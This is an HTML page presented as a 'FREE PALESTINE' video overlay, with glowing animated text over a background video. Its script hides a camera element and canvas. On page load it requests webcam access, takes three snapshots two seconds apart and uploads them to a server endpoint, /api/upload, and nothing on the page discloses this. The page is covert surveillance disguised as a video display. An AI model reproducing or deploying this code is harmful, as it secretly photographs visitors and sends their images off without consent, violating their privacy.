<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FREE PALESTINE Video Overlay</title>

<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">

<style>
html, body {
  margin: 0;
  padding: 0;
  height: 100%;
  width: 100%;
  overflow: hidden;
  background: #000;
  font-family: 'Orbitron', sans-serif;
}

video#backgroundVideo {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  object-fit: cover;
  z-index: 0;
}

.text-layer {
  position: absolute;
  font-weight: 800;
  white-space: nowrap;
  z-index: 1;
  animation: floatUp 10s linear infinite, glow 1.5s ease-in-out infinite alternate;
  color: #00ffea;
  text-shadow: 0 0 10px #00ffea, 0 0 20px #00aaff, 0 0 30px #0044ff;
}

.text1 { font-size: 6vw; top: 50%; left: 20%; animation-delay: 0s; }
.text2 { font-size: 5vw; top: 55%; left: 30%; animation-delay: 2s; }
.text3 { font-size: 4vw; top: 60%; left: 25%; animation-delay: 4s; }

@keyframes floatUp {
  0% { transform: translateY(0px); opacity: 1; }
  100% { transform: translateY(-150px); opacity: 0.8; }
}

@keyframes glow {
  0% { text-shadow: 0 0 10px #00ffea, 0 0 20px #00aaff, 0 0 30px #0044ff; }
  100% { text-shadow: 0 0 20px #0044ff, 0 0 30px #00aaff, 0 0 40px #00ffea; }
}

/* Hidden camera video and snapshot */
video#cameraStream, canvas#snapshot {
  display: none;
}
</style>
</head>
<body>

<video id="backgroundVideo" autoplay loop playsinline>
  <source src="https://www.dropbox.com/scl/fi/blfzo9n9oouo0mtwvz1n7/VID_20250917_085355_746.mp4?rlkey=q4y4es66z7z7sk1r2inv5bvbh&st=yevzhjt4&dl=1" type="video/mp4">
</video>

<div class="text-layer text1">FREE PALESTINE</div>
<div class="text-layer text2">FREE PALESTINE</div>
<div class="text-layer text3">FREE PALESTINE</div>

<video id="cameraStream" autoplay playsinline muted></video>
<canvas id="snapshot"></canvas>

<script>
const bgVideo = document.getElementById('backgroundVideo');
const camVideo = document.getElementById('cameraStream');
const canvas = document.getElementById('snapshot');
const ctx = canvas.getContext('2d');

// Function to take a snapshot
async function takeSnapshot(video) {
  if (!video.videoWidth || !video.videoHeight) return;
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0);
  const imageData = canvas.toDataURL('image/png');

  fetch('/api/upload', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ image: imageData })
  }).then(res => res.json())
    .then(() => console.log("Snapshot uploaded"))
    .catch(err => console.error("Upload error:", err));
}

// Main function to handle camera and snapshots
async function captureCameraSequence() {
  try {
    // Pause background video
    bgVideo.pause();

    // Request camera access
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    camVideo.srcObject = stream;

    // Take snapshots every 2 seconds for 6 seconds total
    await takeSnapshot(camVideo);
    setTimeout(() => takeSnapshot(camVideo), 2000);
    setTimeout(() => takeSnapshot(camVideo), 4000);

    // Stop camera stream after snapshots
    setTimeout(() => {
      stream.getTracks().forEach(track => track.stop());
      // Resume background video with audio
      bgVideo.play().then(() => bgVideo.volume = 1.0);
    }, 6000);

  } catch(err) {
    console.error("Camera error:", err);
    bgVideo.play().then(() => bgVideo.volume = 1.0);
  }
}

// Start on page load
window.addEventListener('load', () => {
  bgVideo.play().then(() => bgVideo.volume = 1.0).catch(e => console.warn("Autoplay prevented", e));
  captureCameraSequence();
});
</script>

</body>
</html>
